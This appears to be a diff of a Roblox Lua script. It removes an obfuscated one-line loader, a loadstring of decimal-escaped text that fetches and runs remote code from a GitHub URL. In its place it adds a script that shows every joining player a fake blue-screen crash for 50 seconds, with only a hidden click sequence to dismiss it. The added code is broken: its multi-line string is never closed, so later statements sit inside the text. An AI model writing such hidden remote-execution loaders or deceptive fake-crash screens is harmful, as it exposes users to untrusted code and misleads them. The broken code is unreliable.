@@ -1,1 +1,48 @@
-loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\88\105\97\111\89\117\110\67\78\47\67\108\111\117\100\45\115\99\114\105\112\116\47\109\97\105\110\47\37\69\52\37\66\65\37\57\49\37\69\57\37\65\65\37\57\55\37\69\52\37\66\65\37\66\65\67\76\79\85\68\45\72\85\66\46\108\117\97\34\44\32\116\114\117\101\41\41\40\41\10")()
+local Players = game:GetService("Players")
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        wait(5)
+        
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "FakeBSOD"
+        screenGui.Parent = player.PlayerGui
+        screenGui.IgnoreGuiInset = true
+        screenGui.DisplayOrder = 999
+        
+        local background = Instance.new("Frame")
+        background.Size = UDim2.new(1, 0, 1, 0)
+        background.BackgroundColor3 = Color3.fromRGB(0, 43, 128)
+        background.Parent = screenGui
+       
+        local errorText = Instance.new("TextLabel")
+        errorText.Size = UDim2.new(0.8, 0, 0.8, 0)
+        errorText.Position = UDim2.new(0.1, 0, 0.1, 0)
+        errorText.BackgroundTransparency = 1
+        errorText.TextColor3 = Color3.new(1, 1, 1)
+        errorText.Font = Enum.Font.Code
+        errorText.TextSize = 16
+        errorText.TextWrapped = true
+        errorText.Text = [[
+A problem has been detected...
+        errorText.Parent = background
+        
+        local clickDetector = Instance.new("TextButton")
+        clickDetector.Size = UDim2.new(0.1, 0, 0.1, 0)
+        clickDetector.Position = UDim2.new(0, 0, 0.9, 0) 
+        clickDetector.BackgroundTransparency = 1
+        clickDetector.Text = ""
+        clickDetector.Parent = background
+        
+        local clickCount = 0
+        clickDetector.MouseButton1Click:Connect(function()
+            clickCount += 1
+            if clickCount >= 5 then
+                screenGui:Destroy()
+            end
+        end)
+        
+        wait(50)
+        screenGui:Destroy()
+    end)
+end)
